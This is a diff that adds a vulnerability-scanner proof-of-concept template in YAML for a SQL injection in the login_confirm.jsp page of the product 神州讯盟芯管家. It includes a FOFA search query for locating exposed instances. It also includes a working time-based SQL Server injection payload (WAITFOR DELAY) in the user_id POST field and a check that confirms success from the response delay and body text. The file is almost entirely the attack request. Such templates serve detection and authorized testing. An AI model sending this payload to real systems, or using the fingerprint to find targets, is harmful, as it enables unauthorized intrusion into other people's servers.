@@ -1,0 +1,21 @@
+id: poc-yaml-sunmochina-core-steward-login-confirm-jsp-sqli
+info:
+  name: 神州讯盟芯管家 login_confirm.jsp SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 神州讯盟芯管家
+  fofa: title="神州讯盟芯管家"
+variables:
+  t1: random_int(1,5)
+  t2: t1 + t1
+  t3: t2 + 2
+requests:
+- method: POST
+  path: /login_confirm.jsp
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: user_id=1%27;WAITFOR+DELAY+%270:0:{{.t1}}%27--&sn=8&macadress=&wm_types=%C4%A3%CC%AC%B4%B0%BF%DA&url=%2FSunmoIC%2F698D51A19D8A121CE581499D7B701668.jsp&url2=%2FSunmoIC%2F698D51A19D8A121CE581499D7B701668.jsp&password=admin&version=%D6%D0%CE%C4
+  expression: status_code == 200 && contains(gbk_decode(body),"系统暂无该用户或该用户被锁定") &&
+    contains(gbk_decode(body),"神州讯盟软件") && duration > t2 && duration < t3
+transport: http
